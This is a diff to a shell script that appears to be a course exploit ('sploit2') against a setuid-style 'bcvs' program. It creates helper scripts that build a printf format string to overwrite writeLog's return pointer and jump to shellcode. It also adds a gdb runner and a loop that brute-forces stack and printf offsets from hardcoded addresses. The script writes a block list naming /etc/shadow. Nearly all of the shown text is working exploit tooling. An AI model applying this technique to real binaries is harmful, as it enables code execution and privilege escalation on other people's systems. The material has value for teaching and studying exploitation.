@@ -5,9 +5,24 @@
 ## main and then uses the printf vulnerability in writeLog
 ## to overwite the return pointer to go to this code.
 ## ----------------------------------------------------------- ##
+REPODIR=".bcvs"
+BLOCKLIST="block.list"
+BLOCKLISTPATH="${REPODIR}/${BLOCKLIST}"
+
+rm -rf sploit2_dir
+mkdir -p sploit2_dir
+cd sploit2_dir
+mkdir -p .bcvs
+chmod 777 .bcvs
+touch .bcvs/block.list
+
+#blocklist - Exact copy of the one in bcvs's directory
+echo $REPODIR > $BLOCKLISTPATH
+echo "/etc/" >> $BLOCKLISTPATH
+echo "/etc/shadow" >> $BLOCKLISTPATH
+echo "/sbin/" >> $BLOCKLISTPATH
 
 # ------------------- Create Scripts ------------------- #
-rm -f payload.py
 cat <<EOS > "payload.py"
 #!/usr/bin/python
 
@@ -58,7 +73,6 @@ if __name__ == '__main__':
 EOS
 
 RPTR_REPEAT=6
-
 rm -f gen_fmt_str.py
 cat <<EOS > "gen_fmt_str.py"
 #!/usr/bin/python
@@ -234,7 +248,6 @@ if __name__ == '__main__':
   sys.exit(0)
 EOS
 
-rm -f rerun_sploit.sh
 cat <<EOS > "rerun_sploit.sh"
 #!/bin/bash
 cd ..
@@ -242,7 +255,6 @@ cd ..
 cd sploit2_dir
 EOS
 
-rm -f run_w_gdb.sh
 cat <<EOS > "run_w_gdb.sh"
 #!/bin/bash
 WL_FRAME_ADDR_GUESS="bffff55C"
@@ -265,7 +277,6 @@ echo "\${FORMAT_DIRS}\${SHELLCODE}" > format_str
 gdb -ex "set args ci \"\$FORMAT_ADDRS\" < format_str" /opt/bcvs/bcvs
 EOS
 
-rm -f test_generate.sh
 cat <<EOS > "test_generate.sh"
 ATTACK_JMP_ADDR="804C328"
 FORMAT_ADDRS_LEN=$(( 2 + 16 * $RPTR_REPEAT ))
@@ -309,17 +320,12 @@ echo "Shellcode: ${SHELLCODE}"
 touch temp_file
 
 OFFSET=0
-RET_PTR_LOC="bffff5FC"  # The frame for writeLog shouldn't come before this
+RET_PTR_LOC="bffff56C"  # The frame for writeLog shouldn't come before this
 ATTACK_JMP_ADDR="804C328"  # This is the address with an empty block list
-ATTACK_JMP_ADDR2="804C37B" # Use this one when there is content in the block list
+ATTACK_JMP_ADDR2="804C36B" # Use this one when there is content in the block list
 
 if [[ -s ".bcvs/block.list" ]]; then
   echo "Block list has content. Using ATTACK_JMP_ADDR2=$ATTACK_JMP_ADDR2"
-  ATTACK_JMP_ADDR=$ATTACK_JMP_ADDR2
-fi
-
-if [[ ! -r ".bcvs/block.list" ]]; then
-  echo "Cannot read bcvs file. Assuming we are running in /opt/bcvs. Using ATTACK_JMP_ADDR2=$ATTACK_JMP_ADDR2"
   ATTACK_JMP_ADDR=$ATTACK_JMP_ADDR2
 fi
 
@@ -332,10 +338,10 @@ echo "Format address length: $FORMAT_ADDRS_LEN"
 
 # Now we brute force it. Hopefully if our initial guess isn't too far off we
 # should get it soon.
-while [[ $OFFSET -lt 10 ]]; do
+while [[ $OFFSET -lt 8 ]]; do
   _OFFSET=$(( $OFFSET * 16 ))
-  PRINTF_OFFSET=-1
-  while [[ $PRINTF_OFFSET -lt 2 ]]; do
+  PRINTF_OFFSET=-3
+  while [[ $PRINTF_OFFSET -lt 3 ]]; do
     echo "Generating format string [base,rptr_offset,printf_offset]: [$RET_PTR_LOC,$_OFFSET,$PRINTF_OFFSET]"
     FORMAT_STR=`./gen_fmt_str.py $RET_PTR_LOC $ATTACK_JMP_ADDR $_OFFSET $PRINTF_OFFSET 1`
     FORMAT_ADDRS=${FORMAT_STR:0:$FORMAT_ADDRS_LEN}  # These addresses will go into log (in main)
